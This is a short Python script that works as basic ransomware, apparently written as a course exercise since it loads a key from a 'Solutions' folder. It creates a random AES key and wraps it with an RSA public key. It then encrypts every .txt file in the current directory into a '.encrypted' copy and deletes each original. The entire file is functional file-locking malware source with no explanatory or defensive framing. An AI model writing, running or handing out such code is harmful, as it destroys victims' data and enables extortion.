from Crypto.Cipher import PKCS1_OAEP 
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto import Random
import subprocess
import os

pub_contents = 'MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDKif5MmN8I6i8CJqWl/ye/f2c71s3XS/w5nwSnzbPeNAhMkS0QyNQy36lLCNsJWU81VPsKrdLkerjvakleRCOvHSJnTjiLV9CIdG45RPct82AdmWFdRwjzZPYWSFqAj8f0mxpwYO0+m6kuvFeTgIezWaD++SOgPOQ4atPiKRmncQIDAQAB'

pk = open("./Solutions/e.key", "rb").read()
pub_key = RSA.import_key(pk)

shared = Random.get_random_bytes(16)

cipher = PKCS1_OAEP.new(pub_key)
encrypted_shared_key = cipher.encrypt(shared)

with open('./EncryptedSharedKey', 'wb') as f:
	f.write(encrypted_shared_key)

result = subprocess.run("ls", shell = True, capture_output = True, text = True)
output = result.stdout

file_list = output.strip().split('\n')

for i in file_list:
	if ".txt" in i:
		with open(f"{i}", "rb") as f:
			contents = f.read()

			cipher = AES.new(shared, AES.MODE_CBC)
			encrypted_text = cipher.encrypt(pad(contents, AES.block_size))
			iv = cipher.iv
            #f.truncate(0)
            #f.seek(0)
		with open(f"{i}.encrypted", "wb") as f:
            		f.write(iv)
            		f.write(encrypted_text)

		os.remove(i)


